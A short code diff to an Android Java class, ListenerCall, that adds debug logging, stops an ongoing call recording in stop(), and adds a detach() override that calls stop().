@@ -10,6 +10,9 @@
 package com.android.dvci.listener;
 
 import com.android.dvci.Call;
+import com.android.dvci.auto.Cfg;
+import com.android.dvci.interfaces.Observer;
+import com.android.dvci.util.Check;
 
 public class ListenerCall extends Listener<Call> {
 	/** The Constant TAG. */
@@ -44,7 +47,16 @@ public class ListenerCall extends Listener<Call> {
 
 	@Override
 	protected void stop() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (stop)");
+		}
+		callReceiver.stopOnGoingRec();
+	}
 
+	@Override
+	public synchronized void detach(Observer<Call> o) {
+		super.detach(o);
+		stop();
 	}
 
 	/**
